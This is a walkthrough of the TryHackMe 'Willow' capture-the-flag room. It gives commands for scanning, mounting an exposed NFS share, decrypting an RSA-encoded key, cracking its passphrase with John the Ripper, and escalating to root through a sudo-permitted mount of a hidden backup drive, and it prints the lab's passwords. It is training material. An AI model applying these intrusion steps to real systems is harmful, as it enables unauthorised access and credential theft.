[Willow](https://tryhackme.com/room/willow)

# What lies under the Willow Tree?

## Grab the flags from the Willow

### User Flag:

_https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/_

1. Scan the target system to identify available services

```bash
nmap IP
```

[SCREEN01]

2. Network File System (NFS) often contains sensitive information that can be accessed without authentication
   - Public Key Pair: (23, 37627)
   - Private Key Pair: (61527, 37627)

```bash
showmount -e IP
mkdir /nfs_mount
mount -t nfs IP:/var/failsafe /nfs_mount/
ls -la /nfs_mount/
cat /nfs_mount/rsa_keys
```

[SCREEN02]

3. Navigate to the web server `http://IP:80` and analyze the content. The webpage contains a hex-encoded message. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "From Hex" operation to decode it.

[SCREEN03]

4. Using the RSA private key parameters found in the NFS share, decrypt the encoded message

```python
encrypted = "2367 2367 2367 2367 2367 ... 2367 2367 2367 2367 2367"

n = 37627
d = 61527

rsakey = ""

for s in encrypted.split(" "):
	decrypt = (int(s)**d) % n
	rsakey += chr(decrypt)

print(rsakey)
```

[SCREEN04]

5. The decrypted RSA key is password-protected and needs to be cracked
   - The password is **wildflower**

```bash
chmod 600 willow_key
/opt/john/ssh2john.py willow_key > willow_key.hash
john willow_key.hash --wordlist=/root/Tools/wordlists/rockyou.txt
ssh -i willow_key willow@IP
```

[SCREEN05]

6. User flag is on the `user.jpg` image

```bash
scp -i willow_key willow@IP:/home/willow/user.jpg /root/user.jpg
```

[SCREEN06]

---

### Root Flag:

_Where, on a Linux system, would you first look for unmounted partitions?_

1. Check for privilege escalation opportunities

```bash
sudo -l
ls -la /dev/
```

[SCREEN07]
[SCREEN08]

2. Mount the discovered hidden backup device

```bash
mkdir /tmp/backup
sudo /bin/mount /dev/hidden_backup /tmp/backup
ls -la /tmp/backup
cat /tmp/backup/creds.txt
```

[SCREEN09]

3. Log in as root, and check the `root.txt` file

```bash
su root
# Password: 7QvbvBTvwPspUK
cat /root/root.txt
```

[SCREEN10]

4. Return to the `user.jpg` file and extract the hidden root flag

```bash
steghide extract -sf user.jpg
# Password: 7QvbvBTvwPspUK
cat root.txt
```

[SCREEN11]
